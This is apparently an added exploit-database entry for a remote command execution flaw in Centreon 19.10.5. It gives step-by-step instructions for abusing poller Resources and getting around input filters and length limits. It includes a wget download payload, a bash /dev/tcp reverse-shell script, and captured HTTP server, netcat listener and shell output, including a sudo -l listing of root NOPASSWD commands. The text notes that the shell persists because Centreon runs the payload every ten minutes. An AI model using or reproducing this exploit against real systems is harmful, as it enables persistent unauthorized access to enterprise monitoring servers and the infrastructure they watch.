@@ -1,0 +1,143 @@
+# Exploit Title: Centreon 19.10.5 - Remote Command Execution
+# Date: 2020-01-27
+# Exploit Author: Fabien AUNAY, Omri BASO
+# Vendor Homepage: https://www.centreon.com/
+# Software Link: https://github.com/centreon/centreon
+# Version: 19.10.5
+# Tested on: CentOS 7
+# CVE : -
+
+###########################################################################################################
+Centreon 19.10.5 Remote Command Execution Resources
+
+Trusted by SMBs and Fortune 500 companies worldwide.
+An industry reference in IT Infrastructure monitoring for the enterprise.
+Counts 200,000+ ITOM users worldwide and an international community of software collaborators.
+Presence in Toronto and Luxembourg.
+Deployed in diverse sectors:
+- IT & telecommunication
+- Transportation
+- Government
+- Heath care
+- Retail
+- Utilities
+- Finance & Insurance
+- Aerospace & Defense
+- Manufacturing
+- etc.
+
+It is possible to call binaries not only in default $USER$ path by adding Poller's Resources.
+By adding two entries it is possible to trigger a download exec reverse shell.
+Note, your reverse shell is persistent because Centreon execute your payloads all 10 minutes by default.
+
+Steps:
+Objective 1 : Add Download Resource
+Objective 2 : Add Exec Resource
+Objective 3 : Create your both commands check
+Objective 4 : Create your services and link them with a host
+
+Restart the Central.
+
+###########################################################################################################
+
+# Objective 1 : Add Download Resource
+- Configuration/Pollers/Resources
+
+- Problem:
+Illegal Object Name Characters : ~!$%^&*"|'<>?,()=
+Illegal Macro Output Characters : `~$^&"|'<>
+Maximum client side input size limit: 35
+
+- Information:
+Read Centreon documentation:
+To install Centreon software from the repository, you should first install the centreon-release package,
+which will provide the repository file. Some may not have the wget package installed.
+If not perform the following : yum install wget
+
+Solution 1: Remove restriction in Configuration/Pollers/Engine configuration
+Solution 2: Modify input size inspector in client side <input> size="250"
+Solution 3: Mixed, use a custom payload -> wget -P /tmp/ 127.0.0.1:8080/x.sh
+
+
+# Objective 2 : Add Exec Resource
+- Configuration/Pollers/Resources
+
+- Problem:
+Illegal Object Name Characters : ~!$%^&*"|'<>?,()=
+Illegal Macro Output Characters : `~$^&"|'<>
+Maximum client side input size limit: 35
+
+Solution: Use a custom payload -> bash /tmp/x.sh
+
+
+# Objective 3 : Create your both commands check with your resources $xxx$ without arguments
+# Objective 4 : Create your services and link them with a host
+
+
+POC:
+Payload x.sh : 0<&121-;exec 121<>/dev/tcp/127.0.0.1/1234;sh <&121 >&121 2>&121
+
+python -m SimpleHTTPServer 8080
+Serving HTTP on 0.0.0.0 port 8080 ...
+127.0.0.1 - - [27/Jan/2020 22:13:27] "GET /x.sh HTTP/1.1" 200 -
+
+
+nc -lvnp 1234
+Ncat: Version 7.50
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 127.0.0.1.
+Ncat: Connection from 127.0.0.1:43128.
+id
+uid=993(centreon-engine) gid=990(centreon-engine) groups=990(centreon-engine),992(centreon-broker),993(nagios),994(centreon)
+sudo -l
+Matching Defaults entries for centreon-engine on centreon-lab:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
+    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
+    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
+    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
+    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
+    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin, !requiretty
+
+User centreon-engine may run the following commands on centreon-lab:
+    (root) NOPASSWD: /sbin/service centreontrapd start
+    (root) NOPASSWD: /sbin/service centreontrapd stop
+    (root) NOPASSWD: /sbin/service centreontrapd restart
+    (root) NOPASSWD: /sbin/service centreontrapd reload
+    (root) NOPASSWD: /usr/sbin/service centreontrapd start
+    (root) NOPASSWD: /usr/sbin/service centreontrapd stop
+    (root) NOPASSWD: /usr/sbin/service centreontrapd restart
+    (root) NOPASSWD: /usr/sbin/service centreontrapd reload
+    (root) NOPASSWD: /sbin/service centengine start
+    (root) NOPASSWD: /sbin/service centengine stop
+    (root) NOPASSWD: /sbin/service centengine restart
+    (root) NOPASSWD: /sbin/service centengine reload
+    (root) NOPASSWD: /usr/sbin/service centengine start
+    (root) NOPASSWD: /usr/sbin/service centengine stop
+    (root) NOPASSWD: /usr/sbin/service centengine restart
+    (root) NOPASSWD: /usr/sbin/service centengine reload
+    (root) NOPASSWD: /bin/systemctl start centengine
+    (root) NOPASSWD: /bin/systemctl stop centengine
+    (root) NOPASSWD: /bin/systemctl restart centengine
+    (root) NOPASSWD: /bin/systemctl reload centengine
+    (root) NOPASSWD: /usr/bin/systemctl start centengine
+    (root) NOPASSWD: /usr/bin/systemctl stop centengine
+    (root) NOPASSWD: /usr/bin/systemctl restart centengine
+    (root) NOPASSWD: /usr/bin/systemctl reload centengine
+    (root) NOPASSWD: /sbin/service cbd start
+    (root) NOPASSWD: /sbin/service cbd stop
+    (root) NOPASSWD: /sbin/service cbd restart
+    (root) NOPASSWD: /sbin/service cbd reload
+    (root) NOPASSWD: /usr/sbin/service cbd start
+    (root) NOPASSWD: /usr/sbin/service cbd stop
+    (root) NOPASSWD: /usr/sbin/service cbd restart
+    (root) NOPASSWD: /usr/sbin/service cbd reload
+    (root) NOPASSWD: /bin/systemctl start cbd
+    (root) NOPASSWD: /bin/systemctl stop cbd
+    (root) NOPASSWD: /bin/systemctl restart cbd
+    (root) NOPASSWD: /bin/systemctl reload cbd
+    (root) NOPASSWD: /usr/bin/systemctl start cbd
+    (root) NOPASSWD: /usr/bin/systemctl stop cbd
+    (root) NOPASSWD: /usr/bin/systemctl restart cbd
+    (root) NOPASSWD: /usr/bin/systemctl reload cbd
